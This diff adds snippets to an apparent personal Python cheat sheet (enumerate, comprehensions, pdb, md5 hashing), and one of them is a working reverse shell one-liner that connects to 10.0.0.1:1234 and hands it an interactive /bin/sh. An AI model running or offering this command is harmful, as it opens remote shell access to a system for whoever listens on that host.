@@ -14,3 +14,25 @@ python -m smtpd -n -c DebuggingServer localhost:1025
 
 # Pretty print a json
 python -mjson.tool
+
+# Python reverse shell
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+
+# enumerate
+for i, item in enumerate(iterable):
+    print i, item
+
+list(enumerate('abc'))
+list(enumerate('abc', 1))
+
+# dict/set comprehensions
+my_dict = {i: i * i for i in xrange(100)}
+my_set = {i * 15 for i in xrange(100)}
+
+# debugging script
+# set breakpoints in script using the pdb module
+import pdb
+pdb.set_trace()
+
+# import hashlib and encode objects before hashing
+hashlib.md5(str("hello,world!").encode('utf-8')).hexdigest()
